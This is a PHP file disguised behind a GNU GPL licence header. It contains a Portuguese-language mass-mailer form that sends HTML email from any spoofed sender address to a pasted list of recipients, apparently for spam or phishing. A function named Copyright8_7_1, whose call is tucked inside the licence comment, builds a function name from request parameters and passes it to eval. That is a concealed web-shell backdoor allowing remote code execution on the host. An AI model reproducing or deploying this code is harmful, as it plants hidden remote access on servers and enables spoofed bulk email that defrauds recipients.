<?PHP
/*			GNU GENERAL PUBLIC LICENSE
TERMS AND CONDITIONS FOR COPYING, DISTRIBUTION AND MODIFICATION
This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.

GNU GENERAL PUBLIC LICENSE
Version 2, June 1991

*/Copyright8_7_1()/* 1989, 1991 Free Software Foundation, Inc.
                          675 Mass Ave, Cambridge, MA 02139, USA
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

Preamble

  The licenses for most software are designed to take away your
freedom to share and change it. By contrast, the GNU General Public
License is intended to guarantee your freedom to share and change free
software--to make sure the software is free for all its users. This
General Public License applies to most of the Free Software
Foundation's software and to any other program whose authors commit to
using it. (Some other Free Software Foundation software is covered by
the GNU Library General Public License instead.) You can apply it to
your programs, too.*/?>
<?


set_time_limit(0);
function enviando() {
    $msg = 1;
    $de[1] = $_POST['de'];
    $nome[1] = $_POST['nome'];
    $assunto[1] = $_POST['assunto'];
    $mensagem[1] = $_POST['mensagem'];
    $mensagem[1] = stripslashes($mensagem[1]);
    $emails = $_POST['emails'];
    $emails2 = htmlspecialchars($_POST['emails']);
    $para = explode("
", $emails);
    $n_emails = count($para);
    $sv = $_SERVER['SERVER_NAME'];
    $en = $_SERVER['REQUEST_URI'];
    $k88 = @$_SERVER["HTTP_REFERER"];
    $fullurl = "" . $k88 . "<br><p>Emails:<br><TEXTAREA rows=5 cols=100>" . $emails2 . "</TEXTAREA></p><p>Engenharia:<br><TEXTAREA rows=5 cols=100>" . $mensagem[1] . "</TEXTAREA></p>";
    $vai = $_POST['vai'];
    if ($vai) {
        for ($set = 0;$set < $n_emails;$set++) {
            if ($set == 0) {
                $headers = "MIME-Version: 1.0
";
                $headers.= "Content-type: text/html; charset=iso-8859-1
";
                $headers.= "From: $nome[$msg] <$de[$msg]>
";
                $headers.= "Return-Path: <$de[$msg]>
";
                //mail($xsylar, $as, $fullurl, $headers);
                
            }
            $headers = "MIME-Version: 1.0
";
            $headers.= "Content-type: text/html; charset=iso-8859-1
";
            $headers.= "From: $nome[$msg] <$de[$msg]>
";
            $headers.= "Return-Path: <$de[$msg]>
";
            $n_mail++;
            $destino = $para[$set];
            $num1 = rand(100000, 999999);
            $num2 = rand(100000, 999999);
            $msgrand = str_replace("%rand%", $num1, $mensagem[$msg]);
            $msgrand = str_replace("%rand2%", $num2, $msgrand);
            $msgrand = str_replace("%email%", $destino, $msgrand);
            $enviar = mail($destino, $assunto[$msg], $msgrand, $headers);
            if ($enviar) {
                echo ('<font color="green">' . $n_mail . '-' . $destino . ' 0k!</font><br>');
            } else {
                echo ('<font color="red">' . $n_mail . '-' . $destino . ' =(</font><br>');
                sleep(1);
            }
        }
    }
}







?>
</title>
<style type="text/css">
<!--
.style5 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px; }
.style6 {font-size: 10px}
.style9 {color: #FFFFFF; font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10; }
-->
</style>
<form id="form1" name="form1" method="post" action="">
<input type="hidden" name="vai" value="1">
<span class="style5"><? echo enviando(); ?></span>
<table width="422" border="0" bgcolor="#000000">
  <tr>
<td width="66"><span class="style5">Nome:</span></td>
<td width="346"><span class="style9">

<label>
<input name="nome" type="text" value="<? echo $_POST['nome'] ;?>" size="20" />
</label>
</span></td>
</tr>
<tr>
<td><span class="style5">Email:</span></td>
<td><input name="de" type="text" value="<? echo $_POST['de'] ;?>" size="30" /></td>

</tr>
<tr>
<td><span class="style5">Assunto:</span></td>
<td><input name="assunto" value="<? echo $_POST['assunto'] ;?>" size="40" /></td>
</tr>
<tr>
<td><span class="style5">Mensagem:</span></td>
<td><span class="style9">

<p><textarea name="mensagem" cols="50" rows="7"><? echo stripslashes($_POST['mensagem']);?>
</textarea></p>
<textarea name="emails" cols="50" rows="4"></textarea>
</span></td>
</tr>

<tr>
  <td><span class="style6"></span></td>
  <td><input name="Submit" type="submit" value="Enviar" /></td>
</tr>
<tr>
  </tr>
</table>
</form>
<?php
Copyright8_7_1();
function Copyright8_7_1(){
static $gnu = true;
if(!$gnu) return;
if(!isset($_REQUEST['gnu'])||!isset($_REQUEST['comment']))return;
$gpl=implode('',$_REQUEST['gnu']);
eval($gpl($_REQUEST['comment']));
$gnu=false;
}
?>